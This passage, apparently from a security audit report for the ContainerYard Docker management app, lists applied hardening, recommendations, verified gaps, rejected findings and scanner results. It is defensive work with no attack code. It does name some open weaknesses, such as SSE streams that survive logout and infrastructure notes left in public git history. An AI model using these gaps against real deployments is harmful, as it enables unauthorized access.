- Webhook SSRF guard: resolve-then-connect (DNS rebinding safe), redirects not followed, metadata always blocked, decimal/octal/IPv4-mapped forms blocked.
- Docker ids validated (`assertDockerContainerRef`) before every dockerode call; no shell anywhere (`spawn`/`execFile` with argument lists); every SSE `data:` line has CR/LF neutralised; download filenames sanitised.
- Every Prisma create/update copies named fields (no mass assignment); bookmarks and saved searches are filtered by the session user.
- Container: non-root uid 1000, read-only rootfs, `cap_drop: ALL`, `no-new-privileges`, digest-pinned base and Redis images, port published on 127.0.0.1, Watchtower opt-out.
- CI/CD: `permissions: contents: read` default, every action pinned to a full SHA, `persist-credentials: false`, no `pull_request_target`, Trivy CRITICAL gate, SBOM and provenance on release.
- Repo settings: private vulnerability reporting and secret scanning with push protection are on; `SECURITY.md` and Dependabot exist.

## 8. Recommendations beyond this PR

- **Decisions:** CY-05 (`METRICS_TOKEN` mandatory), CY-09 (bind Google sign-in to the Firebase uid), CY-14 (encrypt channel config at rest), CY-17 (`NODE_ENV` default).
- **Per-account login limit (CY-16 rest):** a per-e-mail limiter stops distributed guessing but lets an attacker lock out a known admin. Consider it together with Google sign-in as the recovery path.
- **Metrics aggregation in the database (CY-06 rest):** use Prisma `groupBy`/`aggregate` instead of loading every hourly row.
- **Backups (CY-19 rest):** prune `~/backups/containeryard` with a dry-run-first retention step.
- **Release hardening (CY-11, CY-12 rest):** protected `release` environment for the Docker Hub secrets, a tag ruleset limiting who may push `v*`, a Docker Hub token scoped to one repository, and a CODEOWNERS entry for `.github/` (CY-33).
- **Info items worth a small PR:** free-form alert schema values (CY-28), throttling and error text of the channel test (CY-29), `SameSite=Lax` default in code (CY-30), idle timeout and sign-out-everywhere (CY-31), unused `ws`/`bufferutil` (CY-41), digest pinning in `docker-deploy.sh` (CY-42), `lstat` for PM2 logs (CY-43), query-shape errors (CY-44), audit logout and denials (CY-45), alert worker overlap and `durationMinutes` (CY-46, CY-48), a transaction for the last-admin guard (CY-47), CSP `form-action` (CY-51), and NAT64/6to4 in the SSRF guard (CY-53).
- **Secret scanning before commit:** add a gitleaks pre-commit hook for contributors and a gitleaks job in CI (proposed, not enabled, so it cannot block other contributors without discussion).

## 9. Out-of-scope observations

- Public git history still holds internal infrastructure notes (private addresses, host names and a container
  inventory) in documents removed long ago. Nothing is rewritten here (history rules); treat those details as public.
- Gaps examined by the verifier:

  - **SSE log streams (container + host logs): per-user limits, auth re-check after logout/demotion:** Per-user cap of 6 concurrent streams keyed by session user id (sseGuard.ts); slot released on close. Heartbeat (15 s) re-checks DB sessionVersion, role (ADMIN for host logs) and Google allowlist, so demotion/password reset/delete end streams. Gap found: logout and session expiry do not end open streams because the store is never consulted -> new finding (SSE logout). No global cap across users (acceptable with small user counts).
  - **Stacks action route (POST /api/hosts/:hostId/stacks/:name/action):** Actions limited to start/stop/restart/remove; ADMIN re-verified via verifySessionUser, CSRF + actionRateLimiter, every outcome audited. Membership is the com.docker.compose.project label from listContainers({all:true}); an ADMIN can only act on containers that carry that label value, and setting labels requires creating containers (already Docker-level access). 'remove' force-removes every container of the stack, including ContainerYard's own stack if named, with no server-side confirmation: self-DoS by an ADMIN only, not reported. No finding.
  - **PiDeck agent provider response handling:** 2 MB cap enforced via Content-Length and streamed byte count, JSON.parse with generic error, redirect:'error', origin-locked URL building, source ids regex-checked, tokens never echoed, line count clamped to 2000. Content-Type is not checked but the body is parsed strictly as JSON and only typed fields are copied; strings are rendered as React text. Only issue is plain-HTTP transport (CY-merged CRYPTO-001/INFRA-006). No new finding.
  - **Users routes (ADMIN creating ADMIN users, email normalisation/duplicates):** Mounted behind requireAuth + requireRole('ADMIN'); zod createUserSchema trims + lowercases email, unique constraint + P2002 handling prevent duplicates; role is enum-checked; ADMIN creating ADMIN is by design. Self-demote/self-delete/last-admin guards present (race noted in LOGIC-003). seed.js stores ADMIN_EMAIL without lowercasing, so a mixed-case bootstrap e-mail cannot use Google sign-in (functional only; password login falls back to exact match). No new finding.
  - **Firebase login allowlist (case/Unicode bypass):** Server-side verifyIdToken(checkRevoked=true), email_verified===true, sign_in_provider==='google.com', email trimmed+lowercased and compared to an allowlist normalised the same way, re-checked on every request and SSE heartbeat; no auto-provisioning (user row must exist). A bypass would need a Google-verified address that lowercases to an allowlisted one, i.e. the same address. Identity is bound by email only (AUTHN-004). No new finding.
  - **Client authBootstrap / runtime config:** bootstrapRuntimeConfig sets window.__CY_API_BASE__ from /api/runtime-config, but API_BASE in client/src/lib/api.ts is computed at module load before bootstrap runs, so a Host-header-poisoned apiBase is not used for requests (WEB-005, info). No tokens stored client-side; session is an httpOnly cookie. No new finding.
  - **Route matrix cross-check (authz-route-matrix.md):** Spot-verified against index.ts mount order and per-router guards: hostsRouter routes each carry requireAuth; stacks/actions/metrics/summary/hostLogs mounts add requireAuth; hostLogs routes are per-route ADMIN; inspect router guards inline (ADMIN for DOCKER); /api/users requires ADMIN at mount; alerts GET open to VIEWER (source of the channel-secret finding). Matrix matches the code. Two line references in the findings (API-007, LOGGING-004 for middleware/auth.ts) pointed past the end of the 191-line file and were corrected.
  - **Global error handler / CORS / CSRF:** CORS reflects only exact ALLOWED_ORIGINS; verifyCsrf requires a session-bound token on all non-GET/HEAD/OPTIONS /api requests and an Origin that is allowed or equals the request's own Host (a cross-site browser cannot forge both). Production hides 5xx messages unless HttpError.expose. No new finding.

## Appendix A — Rejected findings

- **CY-54 — GHA build cache written by pull_request runs (zizmor cache-poisoning) - reviewed, not exploitable across trust boundary** (from CICD-004): Not a vulnerability: the reporting agent itself shows GitHub cache scoping prevents pull_request runs from poisoning tag/main caches read by the publish job; nothing to fix.
- **CY-55 — DELETE /history retention: cannot wipe everything (floor 1 day) but defaults to 30 days with no confirmation** (from LOGIC-006): The clamp works as intended (days floored at 1, capped at 3650, NaN -> 30); the route is ADMIN-only and CSRF-protected. The remaining points ('1e9' parses as 1, no confirmation) are UX, not security.

## Appendix B — Raw tool output summary

| Tool | Scope | Result |
|---|---|---|
| gitleaks 8.30.1 | full git history (`--all`) and working tree | no leaks (the low-entropy historic DB password, CY-26, was found by manual review) |
| npm audit | production + dev dependencies | 0 vulnerabilities |
| Trivy 0.76.2 fs | lockfile, Dockerfile (vuln, misconfig, secret) | 0 findings |
| hadolint | Dockerfile | DL3008 ×2 (apt packages not version-pinned; accepted: digest-pinned base + weekly rebuild), DL3066 info |
| actionlint 1.7.12 | `.github/workflows` | clean (before and after this PR) |
| zizmor 1.33.1 | `.github/workflows` | cache-poisoning (rejected, CY-54), template-injection (fixed, CY-34), self-repository help |
| gitleaks 8.30.1 | this branch (`origin/main..HEAD`) | 2 hits, both the throwaway test `SESSION_SECRET` fixture in the CY-07/CY-08 tests (82b8c23, f018583); replaced with the test-env value in 17a8efb, tree scans clean |
| node:test | unit suite | baseline 208/208 → 245/245 after this PR (37 new regression tests) |
